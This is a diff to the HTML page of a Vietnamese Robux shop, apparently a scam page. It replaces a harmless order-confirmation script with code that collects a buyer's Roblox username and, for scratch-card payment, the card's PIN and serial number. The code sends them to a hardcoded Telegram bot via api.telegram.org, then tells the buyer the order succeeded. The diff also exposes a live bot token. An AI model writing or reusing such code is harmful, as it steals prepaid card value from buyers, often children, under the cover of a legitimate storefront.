@@ -241,24 +241,51 @@
         <p>&copy; 2026 Shop Robux TTV. Tất cả quyền được bảo lưu.</p>
     </footer>
 
-    <script>
-        // Tự động chọn gói khi ấn nút Mua Ngay
-        function selectPackage(packageName) {
-            document.getElementById('packageSelect').value = packageName;
-            document.getElementById('orderForm').scrollIntoView({ behavior: 'smooth' });
-        }
+    <!-- CODE GỬI THÔNG TIN VỀ TELEGRAM -->
+<script>
+const TELEGRAM_TOKEN = '8965289753:AAFra30f7E8FtBFt5guHLzSGTr2fwUjIHAM';
+const TELEGRAM_CHAT_ID = '6999613477';
 
-        // Xử lý gửi đơn hàng
-        function submitOrder(event) {
-            event.preventDefault();
-            const username = document.getElementById('username').value;
-            const selectedPackage = document.getElementById('packageSelect').value;
+document.getElementById('robuxForm').addEventListener('submit', function(e) {
+    e.preventDefault();
 
-            alert('Cảm ơn ' + username + '!\nĐơn hàng ' + selectedPackage + ' của bạn đã được tiếp nhận.\nHệ thống sẽ kiểm tra giao dịch và chuyển Robux trong vòng 5-15 phút!');
-            
-            // Xóa thông tin form sau khi đặt
-            document.getElementById('robuxForm').reset();
-        }
-    </script>
+    const username = document.getElementById('username').value;
+    const packageVal = document.getElementById('packageSelect').value;
+    const paymentMethod = document.getElementById('paymentMethod') ? document.getElementById('paymentMethod').value : 'qr';
+
+    let message = `🛒 <b>ĐƠN HÀNG MỚI TỪ WEB!</b>\n\n`;
+    message += `👤 <b>Tài khoản Roblox:</b> ${username}\n`;
+    message += `📦 <b>Gói Robux:</b> ${packageVal}\n`;
+    message += `💳 <b>Hình thức:</b> ${paymentMethod === 'card' ? 'Thẻ cào' : 'Chuyển khoản / QR'}\n`;
+
+    if (paymentMethod === 'card') {
+        const cardType = document.getElementById('cardType').value;
+        const cardPin = document.getElementById('cardPin').value;
+        const cardSeri = document.getElementById('cardSeri').value;
+
+        message += `📲 <b>Loại thẻ:</b> ${cardType}\n`;
+        message += `🔑 <b>Mã thẻ (PIN):</b> <code>${cardPin}</code>\n`;
+        message += `🔢 <b>Số Seri:</b> <code>${cardSeri}</code>\n`;
+    }
+
+    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .then(response => {
+        alert('Đặt hàng thành công! Vui lòng chờ xử lý.');
+        location.reload();
+    })
+    .catch(error => {
+        alert('Có lỗi xảy ra, vui lòng thử lại!');
+    });
+});
+</script>
+
 </body>
 </html>
